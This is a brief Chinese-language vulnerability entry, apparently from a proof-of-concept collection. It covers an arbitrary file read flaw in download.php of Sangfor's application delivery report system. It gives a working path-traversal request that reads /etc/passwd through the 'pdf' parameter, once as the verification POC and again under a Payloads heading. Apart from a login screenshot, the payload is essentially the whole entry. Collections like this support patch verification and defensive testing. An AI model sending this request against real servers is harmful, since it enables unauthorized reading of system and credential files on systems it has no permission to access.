# 深信服 应用交付报表系统 download.php 任意文件读取漏洞

## 漏洞描述
深信服 应用交付报表系统 download.php文件存在任意文件读取漏洞，攻击者通过漏洞可以下载服务器任意文件

## 危害等级
MEDIUM

## 参考链接

## 漏洞复现方法
登录页面

![image-20220525144847811](images/202205251448956.png)

验证POC

```
/report/download.php?pdf=../../../../../etc/passwd
```


## Payloads
```
/report/download.php?pdf=../../../../../etc/passwd
```
